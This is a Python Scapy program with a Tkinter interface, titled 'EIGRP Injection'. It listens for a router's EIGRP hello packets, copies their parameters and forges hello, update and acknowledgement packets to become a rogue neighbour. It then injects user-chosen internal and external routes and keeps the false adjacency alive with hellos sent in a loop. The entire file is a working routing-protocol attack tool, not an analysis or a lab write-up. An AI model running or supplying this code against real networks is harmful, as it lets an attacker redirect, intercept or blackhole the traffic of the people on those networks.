import threading
from tkinter import *
import tkinter as tk
import tkinter.font as tkFont
from scapy.all import *
import scapy
from scapy.contrib.eigrp import *
import random
from tkinter import PhotoImage

root = Tk()
root.title("EIGRP Injection")

bg_image = PhotoImage(file="start_frame.png")
bg_image2 = PhotoImage(file="parameters_frame.png")
bg_image3 = PhotoImage(file="inject_frame.png")
bg_image4 = PhotoImage(file="success_frame.png")
bg_label = tk.Label(root, image=bg_image)
bg_label.place(relwidth=1, relheight=1)

width=580
height=855
screenwidth = root.winfo_screenwidth()
screenheight = root.winfo_screenheight()
alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
root.geometry(alignstr)
root.resizable(width=False, height=False)

def scan_Button_command():
    def run_Button_command():
        internal_net_1 = input_net_internal_1.get()
        internal_net_2 = input_net_internal_2.get()
        internal_net_3 = input_net_internal_3.get()
        internal_prefix_1 = input_prefix_internal_1.get()
        internal_prefix_2 = input_prefix_internal_2.get()
        internal_prefix_3 = input_prefix_internal_3.get()
        external_net_1 = input_net_external_1.get()
        external_net_2 = input_net_external_2.get()
        external_net_3 = input_net_external_3.get()
        external_prefix_1 = input_prefix_external_1.get()
        external_prefix_2 = input_prefix_external_2.get()
        external_prefix_3 = input_prefix_external_3.get()

        if input_net_internal_1.get() != "":
            if input_net_internal_2.get() != "":
                if input_net_internal_3.get() != "":
                    internal_route = EIGRPIntRoute(nexthop="0.0.0.0", dst=internal_net_1, prefixlen=int(internal_prefix_1)) / EIGRPIntRoute(nexthop="0.0.0.0", dst=internal_net_2, prefixlen=int(internal_prefix_2)) / EIGRPIntRoute(nexthop="0.0.0.0", dst=internal_net_3, prefixlen=int(internal_prefix_3))
        if input_net_internal_1.get() != "":
            if input_net_internal_2.get() != "":
                if input_net_internal_3.get() == "":
                    internal_route = EIGRPIntRoute(nexthop="0.0.0.0", dst=internal_net_1, prefixlen=int(internal_prefix_1)) / EIGRPIntRoute(nexthop="0.0.0.0", dst=internal_net_2, prefixlen=int(internal_prefix_2))
        if input_net_internal_1.get() != "":
            if input_net_internal_2.get() == "":
                if input_net_internal_3.get() == "":
                    internal_route = EIGRPIntRoute(nexthop="0.0.0.0", dst=internal_net_1, prefixlen=int(internal_prefix_1))
        if input_net_internal_1.get() == "":
            if input_prefix_external_2.get() == "":
                if input_net_internal_3.get() == "":
                    internal_route = ""

        if input_net_external_1.get() != "":
            if input_net_external_2.get() != "":
                if input_net_external_3.get() != "":
                    external_route = EIGRPExtRoute(nexthop="0.0.0.0", dst=external_net_1, prefixlen=int(external_prefix_1)) / EIGRPExtRoute(nexthop="0.0.0.0", dst=external_net_2, prefixlen=int(external_prefix_2)) / EIGRPExtRoute(nexthop="0.0.0.0", dst=external_net_3, prefixlen=int(external_prefix_3))
        if input_net_external_1.get() != "":
            if input_net_external_2.get() != "":
                if input_net_external_3.get() == "":
                    external_route = EIGRPExtRoute(nexthop="0.0.0.0", dst=external_net_1, prefixlen=int(external_prefix_1)) / EIGRPExtRoute(nexthop="0.0.0.0", dst=external_net_2, prefixlen=int(external_prefix_2))
        if input_net_external_1.get() != "":
            if input_net_external_2.get() == "":
                if input_net_external_3.get() == "":
                    external_route = EIGRPExtRoute(nexthop="0.0.0.0", dst=external_net_1, prefixlen=int(external_prefix_1))
        if input_net_external_1.get() == "":
            if input_net_external_2.get() == "":
                if input_net_external_3.get() == "":
                    external_route = ""

        def hello():
            hello_packet = Ether(dst="01:00:5e:00:00:0a") / IP(dst="224.0.0.10", ttl=2) / EIGRP(opcode=5, asn=autonomous_system) / EIGRPParam(holdtime=hold_time, k1=k1, k2=k2, k3=k3, k4=k4, k5=k5) / EIGRPSwVer(ios=ios)
            sendp(hello_packet, iface="Ethernet", count=1)

        def ack_send(packet):
            if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 1:
                ack = packet[EIGRP].seq
                ack_packet = Ether(dst=target_mac) / IP(dst=target_ip, ttl=2) / EIGRP(opcode=5, asn=autonomous_system, ack=ack)
                sendp(ack_packet, iface="Ethernet", count=1)

        def update():
            init_packet = Ether(dst=target_mac) / IP(dst=target_ip, ttl=2) / EIGRP(opcode=1, asn=autonomous_system, seq=seq, flags=1)
            sendp(init_packet, iface="Ethernet", count=1)
            update_packet = Ether(dst=target_mac) / IP(dst=target_ip, ttl=2) / EIGRP(opcode=1, asn=autonomous_system, seq=seq + 1, flags=8) / internal_route / external_route
            sendp(update_packet, iface="Ethernet", count=1)

        def exchange_successfully(packet):
            if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 1:
                ack = packet[EIGRP].seq
                ack_packet = Ether(dst=target_mac) / IP(dst=target_ip, ttl=2) / EIGRP(opcode=5, asn=autonomous_system, ack=ack)
                sendp(ack_packet, iface="Ethernet", count=1)
            if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 1:
                if packet.haslayer(EIGRPIntRoute):
                    if packet[EIGRPIntRoute].dst == internal_net_1 or packet[EIGRPIntRoute].dst == internal_net_2 or packet[EIGRPIntRoute].dst == internal_net_3:
                        bg_label.config(image=bg_image4)
                if packet.haslayer(EIGRPExtRoute):
                    if packet[EIGRPExtRoute].dst == external_net_1 or packet[EIGRPExtRoute].dst == external_net_2 or packet[EIGRPExtRoute].dst == external_net_3:
                        bg_label.config(image=bg_image4)
                else:
                    print("Ввести инъекцию не удалось!")

        hello()
        sniff(filter="ip proto 88", prn=ack_send, count=5, iface="Ethernet")
        seq = random.randint(1, 99)
        update()
        sniff(filter="ip proto 88", prn=ack_send, count=2, iface="Ethernet")
        sniff(filter="ip proto 88", prn=exchange_successfully, count=1, iface="Ethernet")
        hello_packet = Ether(dst="01:00:5e:00:00:0a") / IP(dst="224.0.0.10", ttl=2) / EIGRP(opcode=5, asn=autonomous_system) / EIGRPParam(holdtime=hold_time, k1=k1, k2=k2, k3=k3, k4=k4, k5=k5) / EIGRPSwVer(ios=ios)
        sendp(hello_packet, iface="Ethernet", loop=1, inter=5)

    bg_label.config(image=bg_image2)
    def analyze_packet(packet):
        if packet.haslayer(EIGRP):
            global target_mac
            target_mac = packet[Ether].src
        if packet.haslayer(EIGRP):
            global target_ip
            target_ip = packet[IP].src
        if packet.haslayer(EIGRP):
            global autonomous_system
            autonomous_system = packet[EIGRP].asn
        if packet.haslayer(EIGRP):
            global k1, k2, k3, k4, k5
            k1 = packet[EIGRPParam].k1
            k2 = packet[EIGRPParam].k2
            k3 = packet[EIGRPParam].k3
            k4 = packet[EIGRPParam].k4
            k5 = packet[EIGRPParam].k5
        if packet.haslayer(EIGRP):
            global hold_time
            hold_time = packet[EIGRPParam].holdtime
        if packet.haslayer(EIGRP):
            global ios
            ios = packet[EIGRPSwVer].ios

    sniff(filter="ip proto 88", prn=analyze_packet, count=1, iface="Ethernet")

    bg_label.config(image=bg_image3)

    mac_param = tk.Label(root, bg="white")
    ft = tkFont.Font(family='Times', size=10)
    mac_param["bg"] = "white"
    mac_param["font"] = ft
    mac_param["fg"] = "#000000"
    mac_param["justify"] = "center"
    mac_param["text"] = target_mac
    mac_param.place(x=38, y=432, width=132, height=25)

    ip_param = tk.Label(root, bg="white")
    ft = tkFont.Font(family='Times', size=10)
    ip_param["bg"] = "white"
    ip_param["font"] = ft
    ip_param["fg"] = "#000000"
    ip_param["justify"] = "center"
    ip_param["text"] = target_ip
    ip_param.place(x=38, y=366, width=132, height=25)

    hold_time_param = tk.Label(root, bg="white")
    ft = tkFont.Font(family='Times', size=10)
    hold_time_param["bg"] = "white"
    hold_time_param["font"] = ft
    hold_time_param["fg"] = "#000000"
    hold_time_param["justify"] = "center"
    hold_time_param["text"] = hold_time
    hold_time_param.place(x=481, y=366, width=65, height=25)

    as_param = tk.Label(root, bg="white")
    ft = tkFont.Font(family='Times', size=10)
    as_param["bg"] = "white"
    as_param["font"] = ft
    as_param["fg"] = "#000000"
    as_param["justify"] = "center"
    as_param["text"] = autonomous_system
    as_param.place(x=295, y=366, width=65, height=25)

    k_param = tk.Label(root, bg="white")
    ft = tkFont.Font(family='Times', size=10)
    k_param["bg"] = "white"
    k_param["font"] = ft
    k_param["fg"] = "#000000"
    k_param["justify"] = "center"
    k_param["text"] = f"K1 = {k1},  K2 = {k2},  K3 = {k3},  K4 = {k4},  K5 = {k5}"
    k_param.place(x=299, y=432, width=245, height=25)

    global input_net_internal_1
    input_net_internal_1 = tk.Entry(root, bg="white")
    input_net_internal_1["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_net_internal_1["font"] = ft
    input_net_internal_1["fg"] = "#000000"
    input_net_internal_1["justify"] = "center"
    input_net_internal_1.place(x=37, y=534, width=134, height=27)

    global input_prefix_internal_1
    input_prefix_internal_1 = tk.Entry(root, bg="white")
    input_prefix_internal_1["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_prefix_internal_1["font"] = ft
    input_prefix_internal_1["fg"] = "#000000"
    input_prefix_internal_1["justify"] = "center"
    input_prefix_internal_1.place(x=220, y=534, width=27, height=27)

    global input_net_internal_2
    input_net_internal_2 = tk.Entry(root, bg="white")
    input_net_internal_2["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_net_internal_2["font"] = ft
    input_net_internal_2["fg"] = "#000000"
    input_net_internal_2["justify"] = "center"
    input_net_internal_2.place(x=37, y=576, width=134, height=27)

    global input_prefix_internal_2
    input_prefix_internal_2 = tk.Entry(root, bg="white")
    input_prefix_internal_2["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_prefix_internal_2["font"] = ft
    input_prefix_internal_2["fg"] = "#000000"
    input_prefix_internal_2["justify"] = "center"
    input_prefix_internal_2.place(x=220, y=576, width=27, height=27)

    global input_net_internal_3
    input_net_internal_3 = tk.Entry(root, bg="white")
    input_net_internal_3["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_net_internal_3["font"] = ft
    input_net_internal_3["fg"] = "#000000"
    input_net_internal_3["justify"] = "center"
    input_net_internal_3.place(x=37, y=618, width=134, height=27)

    global input_prefix_internal_3
    input_prefix_internal_3 = tk.Entry(root, bg="white")
    input_prefix_internal_3["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_prefix_internal_3["font"] = ft
    input_prefix_internal_3["fg"] = "#000000"
    input_prefix_internal_3["justify"] = "center"
    input_prefix_internal_3.place(x=220, y=618, width=27, height=27)

    global input_net_external_1
    input_net_external_1 = tk.Entry(root, bg="white")
    input_net_external_1["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_net_external_1["font"] = ft
    input_net_external_1["fg"] = "#000000"
    input_net_external_1["justify"] = "center"
    input_net_external_1.place(x=334, y=534, width=134, height=27)

    global input_prefix_external_1
    input_prefix_external_1 = tk.Entry(root, bg="white")
    input_prefix_external_1["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_prefix_external_1["font"] = ft
    input_prefix_external_1["fg"] = "#000000"
    input_prefix_external_1["justify"] = "center"
    input_prefix_external_1.place(x=516, y=534, width=27, height=27)

    global input_net_external_2
    input_net_external_2 = tk.Entry(root, bg="white")
    input_net_external_2["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_net_external_2["font"] = ft
    input_net_external_2["fg"] = "#000000"
    input_net_external_2["justify"] = "center"
    input_net_external_2.place(x=334, y=576, width=134, height=27)

    global input_prefix_external_2
    input_prefix_external_2 = tk.Entry(root, bg="white")
    input_prefix_external_2["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_prefix_external_2["font"] = ft
    input_prefix_external_2["fg"] = "#000000"
    input_prefix_external_2["justify"] = "center"
    input_prefix_external_2.place(x=516, y=576, width=27, height=27)

    global input_net_external_3
    input_net_external_3 = tk.Entry(root, bg="white")
    input_net_external_3["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_net_external_3["font"] = ft
    input_net_external_3["fg"] = "#000000"
    input_net_external_3["justify"] = "center"
    input_net_external_3.place(x=334, y=618, width=134, height=27)

    global input_prefix_external_3
    input_prefix_external_3 = tk.Entry(root, bg="white")
    input_prefix_external_3["borderwidth"] = "0px"
    ft = tkFont.Font(family='Times', size=11)
    input_prefix_external_3["font"] = ft
    input_prefix_external_3["fg"] = "#000000"
    input_prefix_external_3["justify"] = "center"
    input_prefix_external_3.place(x=516, y=618, width=27, height=27)

    run_Button=tk.Button(root, borderwidth=0, image=button_image_1, background="white", activebackground='white')
    run_Button["justify"] = "center"
    run_Button["command"] = threading.Thread(target=run_Button_command).start
    run_Button.place(x=242, y=688, width=96, height=96)

button_image_1 = PhotoImage(file="Run_button.png")
button_image = PhotoImage(file="Scan_button.png")

scan_Button=tk.Button(root, borderwidth=0, image=button_image, background="white", activebackground='white')
scan_Button["justify"] = "center"
scan_Button["command"] = threading.Thread(target=scan_Button_command).start
scan_Button.place(x=242, y=201, width=96, height=96)

root.mainloop()